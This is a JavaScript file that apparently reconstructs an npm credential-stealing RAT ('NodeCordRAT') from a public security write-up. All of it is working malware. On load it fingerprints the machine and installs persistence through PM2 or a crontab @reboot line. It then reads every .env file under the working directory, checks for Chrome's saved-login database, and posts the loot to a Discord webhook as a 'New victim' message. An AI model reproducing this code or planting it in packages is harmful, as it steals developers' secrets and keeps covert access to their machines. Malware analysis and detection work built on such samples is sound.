// pm2-persistence-rat — reconstructed from public security analyses
// Source: https://www.zscaler.com/blogs/security-research/malicious-npm-packages-deliver-nodecordrat
//
// Discord-based C2 RAT with PM2 process manager persistence.
// Creates private Discord channels named with machine fingerprint.
// Supports commands: shell execution, screenshots, file exfiltration.
//
// Technique: Discord bot C2 + PM2 persistence + machine fingerprint

const os = require("os");
const fs = require("fs");
const path = require("path");
const https = require("https");
const { exec, execSync, spawn } = require("child_process");
const crypto = require("crypto");

// Generate machine fingerprint
function getMachineId() {
  try {
    if (os.platform() === "win32") {
      return execSync("wmic csproduct get UUID", { encoding: "utf8" }).split("\n")[1].trim();
    } else if (os.platform() === "darwin") {
      return execSync("ioreg -rd1 -c IOPlatformExpertDevice | grep IOPlatformUUID", { encoding: "utf8" }).match(/"([^"]+)"/)[1];
    } else {
      return fs.readFileSync("/etc/machine-id", "utf8").trim();
    }
  } catch(e) {
    return crypto.randomBytes(8).toString("hex");
  }
}

// Install PM2 persistence
function installPersistence() {
  try {
    // Check if PM2 is available
    var pm2Binary = execSync("which pm2 || where pm2", { encoding: "utf8" }).trim();
    spawn(pm2Binary, ["start", __filename, "--name", "bip40"], {
      detached: true,
      stdio: "ignore"
    }).unref();
  } catch(e) {
    // Fallback: crontab persistence
    try {
      var cronLine = "@reboot node " + __filename;
      execSync("(crontab -l 2>/dev/null; echo '" + cronLine + "') | crontab -");
    } catch(e2) {}
  }
}

// Collect system data and credentials
function collect() {
  var data = {
    machineId: getMachineId(),
    hostname: os.hostname(),
    platform: os.platform(),
    user: os.userInfo().username,
    home: os.homedir()
  };

  // Harvest .env files recursively from CWD
  function findEnvFiles(dir, depth) {
    if (depth > 3) return [];
    var found = [];
    try {
      var entries = fs.readdirSync(dir);
      entries.forEach(function(e) {
        if (e === "node_modules" || e === ".git") return;
        var fp = path.join(dir, e);
        try {
          var stat = fs.statSync(fp);
          if (stat.isFile() && e.startsWith(".env")) {
            found.push({ path: fp, content: fs.readFileSync(fp, "utf8") });
          } else if (stat.isDirectory()) {
            found = found.concat(findEnvFiles(fp, depth + 1));
          }
        } catch(e) {}
      });
    } catch(e) {}
    return found;
  }

  data.envFiles = findEnvFiles(process.cwd(), 0);

  // Harvest Chrome Login Data path
  var loginDataPath = path.join(os.homedir(), "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data");
  try {
    if (fs.existsSync(loginDataPath)) {
      data.chromeLoginData = true;
    }
  } catch(e) {}

  return data;
}

// Exfiltrate to Discord webhook
function exfiltrate(data) {
  var channelName = os.platform().substring(0, 5) + "-" + getMachineId().substring(0, 8);

  var payload = JSON.stringify({
    content: "**New victim:** " + channelName + "\n```json\n" + JSON.stringify(data, null, 2).substring(0, 1900) + "\n```"
  });

  var req = https.request({
    hostname: "discord.com",
    path: "/api/webhooks/1234567890/AbCdEfGhIjKlMnOpQrStUvWxYz",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(payload)
    }
  });
  req.write(payload);
  req.end();
}

installPersistence();
exfiltrate(collect());
